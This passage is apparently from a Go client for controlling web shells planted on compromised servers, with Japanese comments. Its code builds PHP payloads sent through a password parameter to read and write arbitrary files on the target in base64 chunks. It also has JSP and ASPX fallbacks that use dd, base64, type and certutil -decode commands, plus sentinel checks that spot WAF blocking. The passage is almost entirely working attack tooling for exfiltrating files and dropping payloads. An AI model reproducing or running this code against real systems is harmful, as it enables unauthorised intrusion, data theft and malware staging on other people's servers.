}

func sameStrings(a, b []string) bool {
	if len(a) != len(b) {
		return false
	}
	for i := range a {
		if a[i] != b[i] {
			return false
		}
	}
	return true
}

// ---------------- ファイル操作 ----------------

// phpFileOp は PHP ファイル操作 payload を 1 つ送り、センチネルの内容を取り出す（センチネルは呼び出し側が構築して渡す）。
func (s *HTTPShell) phpFileOp(ctx context.Context, payload string, m sentinel, timeout time.Duration) (string, error) {
	body, err := s.post(ctx, url.Values{s.password: {payload}}, timeout)
	if err != nil {
		return "", err
	}
	out, ok := m.extract(body)
	if !ok {
		return "", opError("file", "ファイル操作のエコー出力にセンチネルがありません（WAF によるブロックの疑い）。エコー出力の要約: %q", excerpt(body, 300))
	}
	return out, nil
}

// ReadFile はターゲット側のファイルを ChunkSize ごとに分けて読む（base64 で返送）。
func (s *HTTPShell) ReadFile(ctx context.Context, path string) ([]byte, error) {
	if strings.TrimSpace(path) == "" {
		return nil, opError("read", "path が空です")
	}
	if s.lang != "php" {
		return s.readFileShell(ctx, path)
	}
	var out []byte
	for offset := 0; ; offset += ChunkSize {
		m := newSentinel()
		payload := `echo "` + m.start + `";` +
			`$f=base64_decode("` + b64e([]byte(path)) + `");` +
			`$h=@fopen($f,"rb");if(!$h){echo "READFAIL";}` +
			`else{@fseek($h,` + fmt.Sprint(offset) + `);echo base64_encode(@fread($h,` + fmt.Sprint(ChunkSize) + `));@fclose($h);}` +
			`echo "\n` + m.end + `";`
		raw, err := s.phpFileOp(ctx, payload, m, 30*time.Second)
		if err != nil {
			return nil, err
		}
		if strings.Contains(raw, "READFAIL") {
			return nil, opError("read", "読み取りに失敗しました（ファイルが存在しないか権限がありません）: %s", path)
		}
		chunk, err := base64.StdEncoding.DecodeString(strings.TrimSpace(raw))
		if err != nil {
			return nil, opError("read", "エコー出力の base64 デコードに失敗しました（エコー出力が汚染されています）: %v", err)
		}
		out = append(out, chunk...)
		if len(chunk) < ChunkSize {
			return out, nil // 短いチャンク = EOF
		}
	}
}

// readFileShell は JSP/ASPX のフォールバック読み取り経路：linux は dd でチャンク化 + base64、windows は type。
func (s *HTTPShell) readFileShell(ctx context.Context, path string) ([]byte, error) {
	if s.platform == "windows" {
		stdout, _, err := s.execCmd(ctx, "type "+path, 30*time.Second)
		if err != nil {
			return nil, err
		}
		return []byte(stdout), nil
	}
	q := shellQuote(path)
	var out []byte
	for skip := 0; ; skip++ {
		stdout, _, err := s.execSh(ctx,
			fmt.Sprintf("dd if=%s bs=%d skip=%d 2>/dev/null | base64 -w0", q, ChunkSize, skip), 60*time.Second)
		if err != nil {
			return nil, err
		}
		chunk, derr := base64.StdEncoding.DecodeString(strings.TrimSpace(stdout))
		if derr != nil {
			return nil, opError("read", "エコー出力の base64 デコードに失敗しました: %v（元の要約: %q）", derr, excerpt(stdout, 200))
		}
		out = append(out, chunk...)
		if len(chunk) < ChunkSize {
			return out, nil
		}
	}
}

// WriteFile はターゲット側のファイルを ChunkSize ごとに append して書く（base64 の暗号文をそのままターゲット側でデコード）。
func (s *HTTPShell) WriteFile(ctx context.Context, path string, data []byte) error {
	if strings.TrimSpace(path) == "" {
		return opError("write", "path が空です")
	}
	if s.lang == "php" {
		return s.writeFilePHP(ctx, path, data)
	}
	if s.platform == "windows" {
		return s.writeFileCmd(ctx, path, data)
	}
	return s.writeFileSh(ctx, path, data)
}

func (s *HTTPShell) writeFilePHP(ctx context.Context, path string, data []byte) error {
	if len(data) == 0 {
		data = []byte{} // 明示的に空ファイルを作る
	}
	for off := 0; off < len(data) || (off == 0 && len(data) == 0); off += ChunkSize {
		end := off + ChunkSize
		if end > len(data) {
			end = len(data)
		}
		chunk := data[off:end]
		flag := "0"
		if off > 0 {
			flag = "FILE_APPEND"
		}
		m := newSentinel()
		payload := `echo "` + m.start + `";` +
			`$r=@file_put_contents(base64_decode("` + b64e([]byte(path)) + `"),` +
			`base64_decode("` + b64e(chunk) + `"),` + flag + `);` +
			`echo ($r===false?"WRITEFAIL":"WRITEOK");` +
			`echo "\n` + m.end + `";`
		raw, err := s.phpFileOp(ctx, payload, m, 90*time.Second)
		if err != nil {
			return err
		}
		if strings.Contains(raw, "WRITEFAIL") {
			return opError("write", "書き込みに失敗しました（ディレクトリが書き込み不可）: %s（%d 番目のチャンク）", path, off/ChunkSize+1)
		}
		if !strings.Contains(raw, "WRITEOK") {
			return opError("write", "書き込みの確認が異常です：ターゲットのエコー出力 %q", excerpt(raw, 200))
		}
		if len(data) == 0 || end >= len(data) {
			return nil
		}
	}
	return nil
}

// writeFileSh は JSP（linux）の経路:チャンクごとに echo b64 | base64 -d >> でターゲットへ書く。
func (s *HTTPShell) writeFileSh(ctx context.Context, path string, data []byte) error {
	q := shellQuote(path)
	for off := 0; off < len(data) || (off == 0 && len(data) == 0); off += ChunkSize {
		end := off + ChunkSize
		if end > len(data) {
			end = len(data)
		}
		op := ">"
		if off > 0 {
			op = ">>"
		}
		_, _, err := s.execSh(ctx, "echo "+b64e(data[off:end])+" | base64 -d "+op+" "+q, 90*time.Second)
		if err != nil {
			return err
		}
		if len(data) == 0 || end >= len(data) {
			return nil
		}
	}
	return nil
}

// writeFileCmd は ASPX（windows）の経路:パイプの base64 がないため、まず b64 をチャンクごとに
// 一時ファイルへ append し、certutil -decode で一度に整形してから削除する。
func (s *HTTPShell) writeFileCmd(ctx context.Context, path string, data []byte) error {
	var b [6]byte
	_, _ = rand.Read(b[:])
	tmp := "%TEMP%\\artex_" + hex.EncodeToString(b[:]) + ".b64"
	for off := 0; off < len(data) || (off == 0 && len(data) == 0); off += ChunkSize {
		end := off + ChunkSize
		if end > len(data) {
			end = len(data)
		}
		op := ">"
		if off > 0 {
			op = ">>"
		}
		if _, _, err := s.execCmd(ctx, "echo "+b64e(data[off:end])+" "+op+" "+tmp, 90*time.Second); err != nil {
			return err
		}
		if len(data) == 0 || end >= len(data) {
			break
		}
	}
	if _, _, err := s.execCmd(ctx, "certutil -decode -f "+tmp+" "+path+" &del /q "+tmp, 90*time.Second); err != nil {
		return opError("write", "certutil によるデコード書き込みに失敗しました: %v", err)
	}
	return nil
}

// shellQuote は sh のシングルクォートエスケープ（パス）。
func shellQuote(p string) string {
	return "'" + strings.ReplaceAll(p, "'", `'\''`) + "'"
}
